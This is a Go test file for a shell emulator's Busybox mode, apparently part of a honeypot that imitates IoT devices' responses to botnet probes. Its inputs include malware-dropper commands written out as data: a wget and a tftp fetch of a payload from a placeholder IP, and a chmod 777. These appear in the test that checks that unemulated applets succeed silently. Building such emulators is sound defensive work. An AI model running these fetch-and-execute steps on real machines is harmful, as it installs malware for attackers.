package shell

import (
	"strings"
	"testing"
)

func newBusyboxInterpreter() *Interpreter {
	s := NewInterpreter("root")
	s.Busybox = true
	return s
}

func TestBusyboxUnknownAppletMatchesRealBusybox(t *testing.T) {
	s := newBusyboxInterpreter()
	for _, line := range []string{"/bin/busybox ECCHI", "busybox ECCHI"} {
		out, code, _ := s.Run(line)
		if out != "ECCHI: applet not found" || code != 127 {
			t.Errorf("%q -> (%q, %d), want (\"ECCHI: applet not found\", 127)", line, out, code)
		}
	}
}

func TestBusyboxDelegatesToEmulatedApplets(t *testing.T) {
	s := newBusyboxInterpreter()
	out, code, _ := s.Run("/bin/busybox echo hello")
	if out != "hello" || code != 0 {
		t.Errorf("busybox echo -> (%q, %d), want (\"hello\", 0)", out, code)
	}
	out, _, _ = s.Run("/bin/busybox uname -s")
	if out != "Linux" {
		t.Errorf("busybox uname -s -> %q, want Linux", out)
	}
}

func TestBusyboxRealButUnemulatedAppletSucceedsSilently(t *testing.T) {
	s := newBusyboxInterpreter()
	for _, line := range []string{"/bin/busybox wget http://198.51.100.7/x.sh", "/bin/busybox tftp -g -r m 198.51.100.7", "/bin/busybox chmod 777 .x"} {
		out, code, _ := s.Run(line)
		if out != "" || code != 0 {
			t.Errorf("%q -> (%q, %d), want (\"\", 0)", line, out, code)
		}
	}
}

func TestBusyboxBareShowsBanner(t *testing.T) {
	s := newBusyboxInterpreter()
	out, code, _ := s.Run("/bin/busybox")
	if !strings.HasPrefix(out, "BusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3) multi-call binary.\n") || !strings.Contains(out, "Currently defined functions:") || code != 0 {
		t.Errorf("bare busybox -> (%q, %d)", out, code)
	}
}

func TestBusyboxInCompoundLine(t *testing.T) {
	s := newBusyboxInterpreter()
	out, _, _ := s.Run("cd /tmp; /bin/busybox wget; /bin/busybox ECCHI")
	if strings.Count(out, "applet not found") != 1 || !strings.Contains(out, "ECCHI: applet not found") {
		t.Errorf("compound probe output = %q", out)
	}
}

func TestBusyboxModeShIsANoop(t *testing.T) {
	s := newBusyboxInterpreter()
	out, code, _ := s.Run("sh")
	if out != "" || code != 0 {
		t.Errorf("sh -> (%q, %d), want (\"\", 0)", out, code)
	}
}

func TestBusyboxOffLeavesSSHOutputUnchanged(t *testing.T) {
	s := NewInterpreter("root")
	for line, want := range map[string]string{
		"/bin/busybox ECCHI": "bash: /bin/busybox: command not found",
		"busybox":            "bash: busybox: command not found",
		"sh":                 "bash: sh: command not found",
	} {
		out, code, _ := s.Run(line)
		if out != want || code != 127 {
			t.Errorf("Busybox off: %q -> (%q, %d), want (%q, 127)", line, out, code, want)
		}
	}
}
